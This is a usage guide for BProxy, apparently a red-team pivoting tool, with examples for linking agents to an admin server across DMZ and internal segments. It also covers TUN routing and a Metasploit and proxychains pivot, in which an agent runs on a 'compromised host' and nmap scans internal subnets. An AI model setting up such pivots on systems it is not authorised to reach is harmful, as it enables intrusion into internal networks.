# BProxy Usage Examples

## Example 1: Basic Single Agent Connection

### Scenario
Connect one agent to the admin server and view it in the TUI.

### Steps

**Terminal 1 - Start Admin with TUI:**
```bash
cd /workspace/bproxy
./bin/admin-tui -addr 0.0.0.0:8443
```

**Terminal 2 - Start Agent:**
```bash
cd /workspace/bproxy
./bin/agent -admin 127.0.0.1:8443
```

### Expected Result
- TUI shows agent with unique ID, hostname, and local IP
- Green indicator shows agent is active
- Heartbeat updates every 15 seconds
- Console shows "Agent registered" message

---

## Example 2: Multiple Agents

### Scenario
Connect multiple agents from different machines/containers.

### Steps

**Terminal 1 - Admin:**
```bash
./bin/admin-tui -addr 0.0.0.0:8443
```

**Terminal 2 - Agent 1:**
```bash
./bin/agent -admin <admin-ip>:8443
```

**Terminal 3 - Agent 2:**
```bash
./bin/agent -admin <admin-ip>:8443
```

**Terminal 4 - Agent 3:**
```bash
./bin/agent -admin <admin-ip>:8443
```

### Expected Result
- TUI shows all 3 agents in the topology view
- Each agent has unique ID and hostname
- Use arrow keys to navigate between agents
- Press Enter to select an agent

---

## Example 3: Simulating Network Segmentation

### Scenario
Simulate a DMZ -> Internal Network topology where:
- Admin (Kali) can reach DMZ
- DMZ can reach Internal Network
- Admin cannot directly reach Internal Network

### Network Topology
```
[Admin/Kali] <---> [DMZ Agent] <---> [Internal Agent]
  10.0.0.1          10.0.0.10          192.168.1.10
```

### Steps

**On Kali (Admin):**
```bash
./bin/admin-tui -addr 0.0.0.0:8443
```

**On DMZ Server:**
```bash
./bin/agent -admin 10.0.0.1:8443
```

**On Internal Server (via DMZ):**
```bash
# First, DMZ agent needs to relay connection
# This would be done via admin command (future feature)
./bin/agent -admin 10.0.0.10:8443
```

### Expected Result
- Admin sees both agents
- Topology shows parent-child relationship
- Messages to Internal Agent route through DMZ Agent

---

## Example 4: Testing Heartbeat and Reconnection

### Scenario
Test the heartbeat mechanism and automatic reconnection.

### Steps

**Terminal 1 - Admin:**
```bash
./bin/admin-tui -addr 0.0.0.0:8443
```

**Terminal 2 - Agent:**
```bash
./bin/agent -admin 127.0.0.1:8443
```

**Actions:**
1. Wait for agent to connect (green indicator)
2. Kill the agent process (Ctrl+C)
3. Watch TUI - agent turns red after 60 seconds
4. Restart agent - it reconnects automatically
5. TUI shows agent as green again

### Expected Result
- Dead node detection works (60s timeout)
- Agent reconnects with same or new ID
- No manual intervention needed

---

## Example 5: Custom TLS Certificates

### Scenario
Use custom TLS certificates instead of self-signed.

### Steps

**Generate Certificates:**
```bash
# Generate CA
openssl genrsa -out ca.key 4096
openssl req -new -x509 -days 365 -key ca.key -out ca.crt \
  -subj "/C=US/ST=State/L=City/O=BProxy/CN=BProxy-CA"

# Generate Server Certificate
openssl genrsa -out server.key 4096
openssl req -new -key server.key -out server.csr \
  -subj "/C=US/ST=State/L=City/O=BProxy/CN=bproxy-server"
openssl x509 -req -days 365 -in server.csr -CA ca.crt -CAkey ca.key \
  -set_serial 01 -out server.crt
```

**Start Admin with Custom Cert:**
```bash
./bin/admin-tui -addr 0.0.0.0:8443 -cert server.crt -key server.key
```

**Start Agent:**
```bash
./bin/agent -admin 127.0.0.1:8443
```

### Expected Result
- Connection uses custom certificate
- More secure than self-signed
- Can be validated by custom CA

---

## Example 6: Layer 3 Routing Proxy (Advanced)

### Scenario
Route traffic to internal network 192.168.100.0/24 through BProxy.

### Prerequisites
- Linux system with TUN/TAP support
- Root/sudo access
- Target network accessible from agent

### Steps

**On Kali (Admin) - Requires Root:**
```bash
sudo ./bin/admin-tui -addr 0.0.0.0:8443
```

**In Admin Console (future feature):**
```
> enable-l3-proxy 192.168.100.0/24 <agent-id>
```

**Verify Routing:**
```bash
# Check TUN interface
ip addr show

# Check routing table
ip route show

# Test connectivity
ping 192.168.100.5
```

**On Target (Agent):**
```bash
./bin/agent -admin <kali-ip>:8443
```

### Expected Result
- TUN interface created (e.g., tun0)
- Route added for 192.168.100.0/24
- Ping to 192.168.100.5 works through proxy
- Traffic encapsulated in BProxy protocol

---

## Example 7: Docker Deployment

### Scenario
Deploy BProxy in Docker containers for testing.

### Dockerfile for Admin
```dockerfile
FROM golang:1.21-alpine
WORKDIR /app
COPY . .
RUN go build -o admin cmd/admin/main.go
EXPOSE 8443
CMD ["./admin", "-addr", "0.0.0.0:8443"]
```

### Dockerfile for Agent
```dockerfile
FROM golang:1.21-alpine
WORKDIR /app
COPY . .
RUN go build -o agent cmd/agent/main.go
CMD ["./agent", "-admin", "admin:8443"]
```

### Docker Compose
```yaml
version: '3.8'
services:
  admin:
    build:
      context: .
      dockerfile: Dockerfile.admin
    ports:
      - "8443:8443"
    networks:
      - bproxy-net

  agent1:
    build:
      context: .
      dockerfile: Dockerfile.agent
    depends_on:
      - admin
    networks:
      - bproxy-net

  agent2:
    build:
      context: .
      dockerfile: Dockerfile.agent
    depends_on:
      - admin
    networks:
      - bproxy-net

networks:
  bproxy-net:
    driver: bridge
```

### Run
```bash
docker-compose up
```

---

## Example 8: Performance Testing

### Scenario
Test BProxy with many concurrent agents.

### Script to Launch Multiple Agents
```bash
#!/bin/bash
# launch-agents.sh

ADMIN_ADDR="127.0.0.1:8443"
NUM_AGENTS=50

for i in $(seq 1 $NUM_AGENTS); do
  ./bin/agent -admin $ADMIN_ADDR &
  sleep 0.1
done

echo "Launched $NUM_AGENTS agents"
wait
```

### Steps
```bash
# Terminal 1
./bin/admin-tui -addr 0.0.0.0:8443

# Terminal 2
chmod +x launch-agents.sh
./launch-agents.sh
```

### Expected Result
- TUI shows all 50 agents
- Scrollable list in topology view
- System handles concurrent connections
- Monitor memory and CPU usage

---

## Example 9: Debugging with Verbose Logging

### Scenario
Enable detailed logging for troubleshooting.

### Steps

**Modify admin/admin.go to add debug logging:**
```go
// Add at top of handleStream function
log.Printf("[DEBUG] Stream from %s: type=%v, session=%s", 
    agentID, msg.Type, msg.SessionId)
```

**Run with logging:**
```bash
./bin/admin-tui -addr 0.0.0.0:8443 2>&1 | tee admin.log
```

### Expected Result
- Detailed logs in admin.log
- Can trace message flow
- Useful for debugging issues

---

## Example 10: Integration with Metasploit

### Scenario
Use BProxy as a pivot point for Metasploit.

### Steps

**1. Setup BProxy:**
```bash
# On Kali
./bin/admin-tui -addr 0.0.0.0:8443

# On compromised host
./bin/agent -admin <kali-ip>:8443
```

**2. Configure Metasploit (future feature):**
```
msf6 > use auxiliary/server/socks_proxy
msf6 > set SRVHOST 127.0.0.1
msf6 > set SRVPORT 1080
msf6 > run

# Configure BProxy to forward SOCKS traffic
```

**3. Use Proxychains:**
```bash
proxychains nmap -sT 192.168.100.0/24
```

### Expected Result
- Metasploit traffic routes through BProxy
- Can scan internal networks
- Full red team capability

---

## Troubleshooting Common Issues

### Issue: Agent won't connect
```bash
# Check connectivity
telnet <admin-ip> 8443

# Check firewall
sudo iptables -L -n | grep 8443

# Check admin is listening
sudo netstat -tlnp | grep 8443
```

### Issue: TUI not rendering correctly
```bash
# Set terminal type
export TERM=xterm-256color

# Test terminal capabilities
tput colors
```

### Issue: Permission denied for TUN
```bash
# Load TUN module
sudo modprobe tun

# Check permissions
ls -l /dev/net/tun

# Run with sudo
sudo ./bin/admin-tui
```

---

## Best Practices

1. **Always use TLS**: Never disable TLS in production
2. **Rotate certificates**: Generate new certs regularly
3. **Monitor heartbeats**: Watch for dead nodes
4. **Limit cascading depth**: Max 3-4 levels for performance
5. **Use unique IDs**: Don't reuse agent IDs
6. **Log everything**: Keep audit logs for red team ops
7. **Test failover**: Ensure agents reconnect properly
8. **Secure admin**: Restrict admin port access
9. **Update regularly**: Keep BProxy updated
10. **Document topology**: Map your network before deployment